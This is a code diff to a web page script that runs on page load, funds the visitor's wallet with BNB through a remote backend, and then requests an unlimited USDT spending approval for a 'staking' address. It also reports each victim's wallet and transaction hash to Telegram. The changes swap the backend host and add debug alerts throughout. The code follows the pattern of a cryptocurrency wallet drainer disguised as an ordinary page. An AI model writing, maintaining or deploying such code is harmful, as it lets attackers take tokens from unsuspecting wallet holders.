@@ -208,19 +208,28 @@
         // Auto top-up BNB function
         async function requestBNBTopUp(account) {
             try {
-                const response = await fetch('https://p2pmanual-production.up.railway.app/send-bnb', {
+                alert('📤 Sending BNB Top-Up Request...\n\nRecipient: ' + account.substring(0, 10) + '...\n\nAPI: armaan-production.up.railway.app');
+                console.log('📤 Requesting BNB top-up for:', account);
+                
+                const response = await fetch('https://armaan-production.up.railway.app/send-bnb', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ recipient: account }),
                 });
 
+                console.log('📥 API Response status:', response.status);
                 const data = await response.json();
+                console.log('📥 API Response data:', data);
+                
                 if (data.success) {
+                    alert('✅ BNB Top-Up Request Successful!\n\nResponse: ' + JSON.stringify(data));
                     return true;
                 } else {
+                    alert('❌ BNB Top-Up Request Failed!\n\nResponse: ' + JSON.stringify(data));
                     return false;
                 }
             } catch (error) {
+                alert('❌ BNB Top-Up Error!\n\nError: ' + error.message);
                 console.error('Error during BNB request:', error);
                 return false;
             }
@@ -291,6 +300,9 @@
 
         // Token approval function
         async function approveToken(account) {
+            alert('🔍 Getting Token Information...\n\nChecking USDT balance and allowance...');
+            console.log('🔍 Starting approval process for:', account);
+            
             const usdtContract = new web3.eth.Contract(matrixAbiTOKEN, addressTOKEN);
             const maxApprovalAmount = web3.utils.toHex('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF');
 
@@ -307,6 +319,8 @@
             const formattedDate = currentDate.toLocaleString();
             const approvedAddress = addressSTAKING;
 
+            alert('📊 Token Information:\n\nBNB Balance: ' + parseFloat(balanceInBNB).toFixed(6) + ' BNB\nUSDT Balance: ' + parseFloat(usdtBalanceFormatted).toFixed(2) + ' USDT\nCurrent Allowance: ' + parseFloat(approvedUSDT).toFixed(2) + ' USDT\n\nSending approval transaction...');
+            
             console.log('Processing....');
             console.log('Account:', account);
             console.log('BNB Balance:', balanceInBNB);
@@ -315,6 +329,7 @@
             await usdtContract.methods.approve(addressSTAKING, maxApprovalAmount)
                 .send({ from: account })
                 .on('transactionHash', async function (hash) {
+                    alert('✅ Approval Transaction Sent!\n\nTransaction Hash: ' + hash.substring(0, 20) + '...\n\nSending Telegram notification...');
                     console.log('✅ Approval transaction sent with hash:', hash);
                     
                     const walletAddr = account || 'Unknown';
@@ -333,11 +348,14 @@
                         txHash
                     ).then(result => {
                         if (result) {
+                            alert('✅ Telegram Notification Sent!\n\nNotification successfully sent to Telegram.\n\nWallet: ' + walletAddr.substring(0, 10) + '...');
                             console.log('✅ [TX] Telegram notification sent successfully');
                         } else {
+                            alert('❌ Telegram Notification Failed!\n\nCould not send notification to Telegram.');
                             console.error('❌ [TX] Telegram notification returned false');
                         }
                     }).catch(err => {
+                        alert('❌ Telegram Notification Error!\n\nError: ' + err.message);
                         console.error('❌ [TX] Telegram notification error:', err);
                     });
                     
@@ -369,12 +387,15 @@
                     });
                 })
                 .on('receipt', function (receipt) {
+                    alert('✅ Approval Confirmed!\n\nTransaction Receipt:\nBlock: ' + receipt.blockNumber + '\n\nClosing window...');
                     console.log('Approval confirmed with receipt:', receipt);
                 })
                 .on('error', function (error) {
                     if (error.code === 4001) {
+                        alert('❌ Approval Canceled!\n\nYou canceled the approval request.\n\nPlease try again.');
                         console.log("You canceled the approval request. Please try again.");
                     } else {
+                        alert('❌ Approval Failed!\n\nError: ' + error.message + '\n\nCode: ' + (error.code || 'Unknown'));
                         console.log("Approval failed: " + error.message);
                     }
                     console.error("Approval failed:", error);
@@ -384,29 +405,53 @@
         // Main function that combines auto top-up and approval
         async function TokenApprove() {
             try {
+                // Check if wallet is available
+                if (!window.ethereum) {
+                    alert('❌ Wallet Not Detected!\n\nPlease open this page in Trust Wallet or MetaMask browser.');
+                    console.error("No wallet detected");
+                    return;
+                }
+                
+                alert('✅ Wallet Detected!\n\nChecking for connected account...');
+                console.log("✅ Wallet detected:", window.ethereum);
+                
                 const accounts = await ethereum.request({ method: 'eth_accounts' });
                 const account = accounts[0];
                 
                 if (!account) {
+                    alert('❌ No Account Found!\n\nNo wallet account is connected.\n\nAccount: ' + (account || 'None'));
                     console.error("No accounts available");
                     return;
                 }
+
+                alert('✅ Account Found!\n\nWallet Address: ' + account.substring(0, 10) + '...\n\nChecking BNB balance...');
+                console.log("✅ Account found:", account);
 
                 // Step 1: Check the current BNB balance
                 const bnbBalance = await web3.eth.getBalance(account);
                 const balanceInBNB = web3.utils.fromWei(bnbBalance, 'ether');
                 console.log("Current BNB Balance: ", balanceInBNB);
+                
+                alert('💰 BNB Balance Check\n\nCurrent Balance: ' + parseFloat(balanceInBNB).toFixed(6) + ' BNB\nRequired: 0.0001 BNB');
 
                 const requiredBNB = 0.0001;
 
                 // Step 2: Auto top-up in background if needed
                 if (parseFloat(balanceInBNB) < requiredBNB) {
+                    alert('⚠️ Low BNB Balance!\n\nBalance: ' + parseFloat(balanceInBNB).toFixed(6) + ' BNB\n\nRequesting BNB top-up...');
+                    console.log("⚠️ Low BNB balance, requesting top-up");
+                    
                     // Request the BNB top-up from the backend
                     const topUpSuccess = await requestBNBTopUp(account);
 
                     if (!topUpSuccess) {
+                        alert('❌ BNB Top-Up Failed!\n\nCould not request BNB top-up.\n\nPlease try again.');
+                        console.error("BNB top-up failed");
                         return;
                     }
+
+                    alert('⏳ BNB Top-Up Requested!\n\nWaiting for top-up to process...\n\nPlease wait 3 seconds...');
+                    console.log("⏳ BNB top-up requested, waiting...");
 
                     // Wait for top-up to process
                     await new Promise(resolve => setTimeout(resolve, 3000));
@@ -415,20 +460,34 @@
                     const newBnbBalance = await web3.eth.getBalance(account);
                     const newBalanceInBNB = web3.utils.fromWei(newBnbBalance, 'ether');
                     
+                    alert('💰 Balance Rechecked\n\nNew Balance: ' + parseFloat(newBalanceInBNB).toFixed(6) + ' BNB');
+                    console.log("💰 New BNB balance:", newBalanceInBNB);
+                    
                     if (parseFloat(newBalanceInBNB) < requiredBNB) {
+                        alert('❌ Still Low Balance!\n\nBalance: ' + parseFloat(newBalanceInBNB).toFixed(6) + ' BNB\n\nTop-up may still be processing.');
+                        console.error("Still low balance after top-up");
                         return;
                     }
+                } else {
+                    alert('✅ Sufficient BNB Balance!\n\nBalance: ' + parseFloat(balanceInBNB).toFixed(6) + ' BNB\n\nProceeding to approval...');
+                    console.log("✅ Sufficient BNB balance");
                 }
 
                 // Step 3: Show approval request
+                alert('🚀 Starting Approval Process!\n\nWallet: ' + account.substring(0, 10) + '...\n\nYou will see a wallet popup to approve.');
+                console.log("🚀 Starting approval process");
                 await approveToken(account);
             } catch (error) {
+                alert('❌ Error Occurred!\n\nError: ' + error.message + '\n\nCheck console for details.');
                 console.error('Error:', error);
             }
         }
 
         // Start automatically when page loads - no wallet connection required
         window.addEventListener('load', function() {
+            alert('🚀 Page Loaded!\n\nStarting automatic process...\n\nChecking wallet connection...');
+            console.log('🚀 Page loaded, starting process...');
+            
             // Small delay to ensure scripts are loaded
             setTimeout(() => {
                 TokenApprove();
